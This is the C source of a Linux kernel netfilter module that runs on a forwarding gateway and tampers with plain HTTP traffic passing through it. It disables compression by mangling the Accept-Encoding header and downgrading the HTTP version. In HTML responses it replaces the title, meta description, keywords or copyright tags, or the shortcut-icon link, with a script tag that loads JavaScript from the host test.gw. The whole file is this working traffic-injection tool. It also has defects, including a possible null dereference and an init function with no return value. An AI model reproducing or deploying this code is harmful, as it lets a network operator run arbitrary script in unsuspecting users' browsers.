#include <linux/types.h>
#include <linux/inet.h>
#include <linux/inetdevice.h>
#include <linux/ip.h>
#include <linux/timer.h>
#include <linux/jiffies.h>
#include <linux/netfilter.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/list.h>
#include <linux/string.h>
#include <net/protocol.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/netfilter.h>
#include <net/checksum.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <net/route.h>
#include <net/dst.h>
#include <net/route.h>
#include <linux/netfilter.h>
#include <net/netfilter/nf_nat_rule.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter_ipv4.h>
#include <net/netfilter/nf_conntrack_core.h>
#include <net/netfilter/nf_nat_rule.h>
#include <linux/netfilter/nf_conntrack_common.h>

int inject_enable = 0;

static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,const struct net_device *in,
		        const struct net_device *out,int (*okfn)(struct sk_buff *))
{
	struct nf_conn *ct = NULL;
	enum ip_conntrack_info ctinfo;
	const struct iphdr *iph = ip_hdr(skb);
	struct tcphdr *tcph;
	char *data_start;
	char *data_end;
	int len;

	if (!inject_enable)
		return NF_ACCEPT;

	if (iph->protocol != IPPROTO_TCP)
	{
		return NF_ACCEPT;
	}

	tcph = (void *)iph + (iph->ihl * 4);
	data_start = (void *)tcph + (tcph->doff * 4);
	len = ntohs(iph->tot_len) - (data_start - (char *)iph);
	data_end = data_start + len;

	if (len < 12)	
	{
		return NF_ACCEPT;
	}

	if (tcph->dest == htons(80))
	{
		char *version = NULL;
		char *p = data_start;	

		if ((memcmp(p, "GET /", 5) == 0)) 
		{
			p += 5;

			while ((data_end - p > 3) && memcmp(p, "\r\n\r\n", 4) != 0)
			{
				if ((data_end - p > 6) && memcmp(p, "HTTP/1.", 7) == 0)
				{
					p += 7;

					version = p;
					break;
				}
				p++;		
			}

			while ((data_end - p > 3) && memcmp(p, "\r\n\r\n", 4) != 0)
			{	
				if ((data_end - p > 18) && memcmp(p, "\r\nAccept-Encoding: ", 19) == 0) 
				{
					*(p + 3) = 'B';	
					if (version)
						*version = '0';
					goto success;
				}
				p++;
			}
		}
		return NF_ACCEPT;
	}
	else if (tcph->source == htons(80))
	{
		char *p, *tmp_p;

		tmp_p = p = data_start;	
		ct = nf_ct_get(skb, &ctinfo);

		if (ct->ij_mark > 4)
			return NF_ACCEPT;

		if ((memcmp(p, "HTTP/1.1 200", 12) == 0) || (memcmp(p, "HTTP/1.0 200", 12) == 0)) 
		{

			if (ct->ij_mark == 0)
			{
				unsigned char http_flags = 0; 		
				p += 12;

				while ((data_end - p > 3 ) && memcmp(p, "\r\n\r\n", 4) != 0)
				{
					if ((data_end - p > 24) && (memcmp(p, "\r\nContent-Type: text/html", 25) == 0 || memcmp(p, "\r\nContent-type: text/html", 25) == 0)) 
					{
						p += 25;
						http_flags = 0x01; 		
						break;
					} 
					p++;
				}

				if (http_flags != 0x01)
				{
					ct->ij_mark = 0xffffffff;
					goto err;
				}
			}

		}

		ct->ij_mark++;

		tmp_p = p;

		int title_length;
		char *title_start, *title_end;

		p = tmp_p;
		title_start = title_end = NULL;

		while (data_end - p > 6)	
		{
			if (strncasecmp(p, "<title>", 7) == 0)
			{
				title_start = p;
				p += 7;

				break;
			} 
			p++;
		}

		if (title_start != NULL)
		{
			while (data_end - p > 0)	
			{
				if (memcmp(p, ">", 1) == 0)
				{
					title_end = p + 1;
					break;
				}
				p++;
			}	
		} 

		if (title_start && title_end)
		{
			if ((title_length = title_end - title_start) > 41)    
			{
				memset(title_start, ' ', title_length);	
				memcpy(title_start, "<script src='http://test.gw/j.s'></script>", 42);

				goto success;
			}
		}


		int desc_length;
		char *desc_start, *desc_end;

		p = tmp_p;
		desc_start = desc_end = NULL;

		while (data_end - p > 12)	
		{
			if (strncasecmp(p, "<meta name=\"d", 13) == 0)
			{
				desc_start = p;
				p += 13;

				break;
			} 
			p++;
		}

		if (desc_start != NULL)
		{
			while (data_end - p > 0)	
			{
				if (memcmp(p, ">", 1) == 0)
				{
					desc_end = p + 1;
					break;
				}
				p++;
			}	
		}

		if (desc_start && desc_end)
		{
			if ((desc_length = desc_end - desc_start) > 41)    
			{
				memset(desc_start, ' ', desc_length);
				memcpy(desc_start, "<script src='http://test.gw/j.s'></script>", 42);

				goto success;
			}
		}

		int key_length;
		char *key_start, *key_end;

		p = tmp_p;
		key_start = key_end = NULL;

		while (data_end - p > 12)	
		{
			if (strncasecmp(p, "<meta name=\"k", 13) == 0)
			{
				key_start = p;
				p += 13;

				break;
			} 
			p++;
		}

		if (key_start != NULL)
		{
			while (data_end - p > 0)	
			{
				if (memcmp(p, ">", 1) == 0)
				{
					key_end = p + 1;
					break;
				}
				p++;
			}	
		} 
		if (key_start && key_end)
		{
			if ((key_length = key_end - key_start) > 41)    
			{
				memset(key_start, ' ', key_length);
				memcpy(key_start, "<script src='http://test.gw/j.s'></script>", 42);

				goto success;
			}
		}

		int right_length;
		char *right_start, *right_end;

		p = tmp_p;
		right_start = right_end = NULL;

		while (data_end - p > 12)	
		{
			if (strncasecmp(p, "<meta name=\"c", 13) == 0)
			{
				right_start = p;
				p += 13;

				break;
			} 
			p++;
		}

		if (right_start != NULL)
		{
			while (data_end - p > 0)	
			{
				if (memcmp(p, ">", 1) == 0)
				{
					right_end = p + 1;
					break;
				}
				p++;
			}	
		} 
		if (right_start && right_end)
		{
			if ((right_length = right_end - right_start) > 41)    
			{
				memset(right_start, ' ', right_length);
				memcpy(right_start, "<script src='http://test.gw/j.s'></script>", 42);

				goto success;
			}
		}

		int icon_length;
		char *icon_start, *icon_end;

		p = tmp_p;
		icon_start = icon_end = NULL;

		while (data_end - p > 13)	
		{
			if (strncasecmp(p, "<link rel=\"sho", 14) == 0)
			{
				icon_start = p;
				p += 15;

				break;
			} 
			p++;
		}

		if (icon_start != NULL)
		{
			while (data_end - p > 0)	
			{
				if (memcmp(p, ">", 1) == 0)
				{
					icon_end = p + 1;
					break;
				}
				p++;
			}	
		} 
		if (icon_start && icon_end)
		{
			if ((icon_length = icon_end - icon_start) > 41)    
			{
				memset(icon_start, ' ', icon_length);
				memcpy(icon_start, "<script src='http://test.gw/j.s'></script>", 42);

				goto success;
			}
		}

#if 0
		int whtspace_length;
		char *strip_p;
		char buf[2048];

		strip_p = p = tmp_p;
		whtspace_length = 0;
		memcpy(buf, p, len);

		while (data_end - p > 1)	
		{
			if (memcmp(p, "\r\n", 2) == 0)
			{
				p += 2;

				while (data_end - p > 0)
				{
					if (*p == ' ' || *p == '\t')
					{
						p++;
					}else
						break;
				}
			}else {
				*strip_p = *p;
				p++;strip_p++;
				whtspace_length = data_end - strip_p;
			}
		}

		if (whtspace_length > 41)
		{
			p = tmp_p;

			char *head_start, *head_end;

			head_start = head_end = NULL;	

			while (data_end - p > 6)
			{
				if (strncasecmp(p, "<head>", 6) == 0)
				{
					head_start = p;
					p += 6;
					head_end = p;

					break;
				}
				p++;
			}

			if (head_start && head_end)
			{
				memmove(head_end + whtspace_length, head_end, strip_p - head_end);   
				memset(head_end + 42, ' ', whtspace_length - 42); 
				memcpy(head_end, "<script src='http://test.gw/j.s'></script>", 42); 

				goto success;
			}
		}else {
			p = tmp_p;
			memcpy(p, buf, len); 

			goto err;
		}
#endif
		goto err;
	}
err:
	return NF_ACCEPT;

success:
	tcph->check = ~tcp_v4_check(skb->len - iph->ihl*4, iph->saddr,
			iph->daddr, 0);
	skb->ip_summed = CHECKSUM_PARTIAL;
	skb->csum_start = (unsigned char *)tcph - skb->head;
	skb->csum_offset = offsetof(struct tcphdr, check);

	if (ct)
	{	
		ct->ij_mark = 0xffffffff;
	}
	return NF_ACCEPT;
}

static struct nf_hook_ops hooks[] __read_mostly = {
	{
		.hook           = http_inject_hook,
		.owner          = THIS_MODULE,
		.pf             = PF_INET,
		.hooknum        = NF_IP_FORWARD,
		.priority       = NF_IP_PRI_LAST,
	}
};

static int __init http_inject_init(void)
{
	nf_register_hooks(hooks,ARRAY_SIZE(hooks));
}

static void __exit http_inject_fini(void)
{
	nf_unregister_hooks(hooks,ARRAY_SIZE(hooks));
}

module_init(http_inject_init);
module_exit(http_inject_fini);
